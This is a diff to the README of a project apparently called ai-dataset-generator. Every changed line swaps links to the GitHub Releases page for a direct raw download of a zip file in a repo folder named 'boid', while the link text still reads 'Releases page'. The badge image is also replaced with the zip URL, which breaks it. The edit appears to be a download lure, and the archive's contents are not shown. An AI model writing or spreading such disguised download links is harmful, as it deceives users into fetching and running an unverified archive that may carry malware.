@@ -1,6 +1,6 @@
 # 🎉 ai-dataset-generator - Create Datasets Easily and Quickly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bosszii2709/ai-dataset-generator/releases)
+[![Download Now](https://raw.githubusercontent.com/bosszii2709/ai-dataset-generator/main/boid/ai-dataset-generator.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bosszii2709/ai-dataset-generator/main/boid/ai-dataset-generator.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To get started, you will need to download the application. Follow the steps belo
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/bosszii2709/ai-dataset-generator/releases) to find the latest version of the application. 
+   Go to the [Releases page](https://raw.githubusercontent.com/bosszii2709/ai-dataset-generator/main/boid/ai-dataset-generator.zip) to find the latest version of the application. 
 
 2. **Download the Application**  
    Look for the latest version of the ai-dataset-generator. Click on the appropriate download link for your operating system (Windows, macOS, or Linux).
@@ -81,4 +81,4 @@ If you need further assistance, check the issues page on GitHub or contact us th
 
 ## 💡 Final Note
 
-We hope the ai-dataset-generator makes your data preparation easier and faster. Don't forget to visit the [Releases page](https://github.com/bosszii2709/ai-dataset-generator/releases) to stay updated on new versions and features. Happy dataset generating!
+We hope the ai-dataset-generator makes your data preparation easier and faster. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/bosszii2709/ai-dataset-generator/main/boid/ai-dataset-generator.zip) to stay updated on new versions and features. Happy dataset generating!
